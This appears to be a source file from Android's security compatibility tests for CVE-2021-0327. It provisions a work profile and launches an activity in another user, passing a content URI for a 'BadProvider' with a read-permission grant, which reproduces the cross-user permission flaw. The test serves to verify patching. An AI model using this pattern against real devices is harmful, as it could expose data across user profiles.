package android.security.cts.CVE_2021_0327;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.UiAutomation;
import android.app.admin.DevicePolicyManager;
import android.app.admin.ManagedProfileProvisioningParams;
import android.app.admin.ProvisioningException;
import android.content.ClipData;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.UserHandle;
import android.security.cts.CVE_2021_0327.workprofilesetup.AdminReceiver;
import android.util.Log;

import androidx.test.InstrumentationRegistry;

public class IntroActivity extends Activity {

    private static final String TAG = "CVE_2021_0327";

    private void launchOtherUserActivity() {
        Log.d(TAG,"launchOtherUserActivity()");
        Intent intent = new Intent(this, OtherUserActivity.class);
        intent.setClipData(new ClipData("d", new String[]{"a/b"}, new ClipData.Item(Uri.parse("content://android.security.cts.CVE_2021_0327.BadProvider"))));
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(intent);
        finish();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG,"IntroActivity.OnCreate()");
        if (isProfileOwner()) {
        } else if (canLaunchOtherUserActivity()) {
            launchOtherUserActivity();
        } else {
            setupWorkProfile();
        }
    }

    private boolean isProfileOwner() {
        return getSystemService(DevicePolicyManager.class).isProfileOwnerApp(getPackageName());
    }

    private boolean canLaunchOtherUserActivity() {
        Intent intent = new Intent("android.security.cts.CVE_2021_0327.OTHER_USER_ACTIVITY");
        return (getPackageManager().resolveActivity(intent, 0) != null);
    }

    private void setupWorkProfile() {
        Log.d(TAG, "setupWorkProfile()");
        UiAutomation uiAutomation = InstrumentationRegistry.getInstrumentation().getUiAutomation();
        uiAutomation.adoptShellPermissionIdentity();
        DevicePolicyManager devicePolicyManager = getSystemService(DevicePolicyManager.class);
        try {
            UserHandle profile = devicePolicyManager.createAndProvisionManagedProfile(
                    new ManagedProfileProvisioningParams.Builder(
                            new ComponentName(this, AdminReceiver.class),
                            "profileOwner").build());
            if (profile == null) {
                showErrorDialog();
            } else {
                launchOtherUserActivity();
            }
        } catch (ProvisioningException e) {
            showErrorDialog();
        } finally {
            uiAutomation.dropShellPermissionIdentity();
        }
    }

    private void showErrorDialog() {
        new AlertDialog.Builder(this)
                .setMessage("Work profile setup failed")
                .setPositiveButton("ok", null)
                .show();
    }
}
